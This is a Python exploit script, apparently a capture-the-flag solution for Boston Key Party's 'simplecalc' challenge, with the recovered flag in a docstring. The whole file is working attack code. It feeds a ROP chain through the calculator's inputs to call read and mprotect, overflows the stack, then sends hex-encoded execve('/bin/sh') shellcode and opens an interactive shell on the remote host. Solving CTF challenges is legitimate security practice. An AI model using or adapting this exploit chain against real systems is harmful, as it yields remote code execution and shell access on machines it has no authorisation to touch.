from pwnlib import *

"""
BKPCTF{th3 l4st 1 2 3z}
"""

#s = Socket(("localhost", 4442))
s = Socket(("simplecalc.bostonkey.party", 5500))

s.ru("lations: ")
s.send("252\n")
def clear():
	return s.ru("=> ")
clear()

def number(n):
	s.send("1\n")
	s.ru("x: ")
	s.send("%d\n" % ((n + 1000) % (1<<32)))
	s.ru("y: ")
	s.send("%d\n" % (((1<<32) - 1000) % (1<<32)))
	return clear()


p = 0x6C4AB8



target = 0x6C4000
read = 0x434b29
mprotect = 0x435690 
pop_rdi = 0x0000000000401b73
pop_rsi = 0x0000000000401c87
pop_rdx = 0x0000000000437a85


payload = "A"*48
payload += pq(p) # freed
payload += "B"*16

payload += pq(pop_rdi)
payload += pq(0)
payload += pq(pop_rsi)
payload += pq(target)
payload += pq(pop_rdx)
payload += pq(0x1000)
payload += pq(read)

payload += pq(pop_rdi)
payload += pq(target)
payload += pq(pop_rsi)
payload += pq(0x1000)
payload += pq(pop_rdx)
payload += pq(7)
payload += pq(mprotect)

payload += pq(target)


for block in blocks(payload, 4):
	number(ud(block))

s.send("3\n")
s.ru("x: ")
s.send("%d\n" % 0x2c)
s.ru("y: ")
s.send("%d\n" % 0x3e)
clear()

s.send("2\n")
s.ru("x: ")
s.send("%d\n" % (0x558 | 2))
s.ru("y: ")
s.send("%d\n" % (0xffffffff))
clear()

s.send("5\n")

raw_input("> ")

s.send("31c05048b92f2f62696e2f736851545f5057545e99b03b0f05".decode("hex"))

print "OK"
s.interact()
